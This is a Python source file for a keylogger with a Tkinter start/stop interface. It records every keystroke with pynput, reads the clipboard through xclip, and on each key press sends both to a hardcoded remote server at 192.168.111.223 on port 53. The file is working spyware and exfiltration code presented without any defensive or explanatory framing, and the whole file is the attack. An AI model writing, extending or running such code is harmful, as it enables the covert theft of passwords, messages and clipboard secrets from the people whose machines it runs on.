import threading
import socket
import subprocess
from pynput import keyboard
from tkinter import Tk, Label, Button, Text, END, filedialog, Scrollbar, VERTICAL, RIGHT, Y

SERVER_ADDRESS = ("192.168.111.223", 53)

class Keylogger:
    def __init__(self):
        self.window = Tk()
        self.window.title("Keylogger")
        self.window.geometry("500x400")
        self.logging = False

        self.start_button = Button(self.window, text="Start Keylogging", command=self.start_keylogging)
        self.start_button.pack()

        self.stop_button = Button(self.window, text="Stop Keylogging", command=self.stop_keylogging)
        self.stop_button.pack()

        self.save_button = Button(self.window, text="Save Logs", command=self.save_logs)
        self.save_button.pack()

        self.log_area = Text(self.window, height=15, width=58)
        self.log_area.pack()

        self.scrollbar = Scrollbar(self.window, orient=VERTICAL, command=self.log_area.yview)
        self.log_area['yscrollcommand'] = self.scrollbar.set
        self.scrollbar.pack(side=RIGHT, fill=Y)

        self.window.mainloop()

    def start_keylogging(self):
        if not self.logging:
            self.logging = True
            self.log_area.insert(END, "Keylogger started...\n")
            self.t1 = threading.Thread(target=self.keylogging, daemon=True)
            self.t1.start()

    def stop_keylogging(self):
        if self.logging:
            self.logging = False
            self.log_area.insert(END, "Keylogger stopped...\n")

    def save_logs(self):
        logs = self.log_area.get("1.0", END)
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            with open(file_path, 'w') as file:
                file.write(logs)
            self.log_area.insert(END, f"Logs saved to {file_path}\n")
            
    def keylogging(self):
        def on_key_press(key):
            if not self.logging:
                return False

            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.connect(SERVER_ADDRESS)

                try:
                    clipboard_data = subprocess.check_output(["xclip", "-selection", "clipboard", "-o"]).decode().strip()
                    server.send(f'Clipboard data: {clipboard_data}\n'.encode())
                except Exception as e:
                    server.send(f'Failed to fetch clipboard data: {e}\n'.encode())

                server.send(f'Keystroke: {key}\n'.encode())
                server.close()

                self.log_area.insert(END, f'Keystroke: {key}\n')
                self.log_area.see(END)
            except Exception as e:
                self.log_area.insert(END, f"Error: {e}\n")

        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()

if __name__ == "__main__":
    Keylogger()

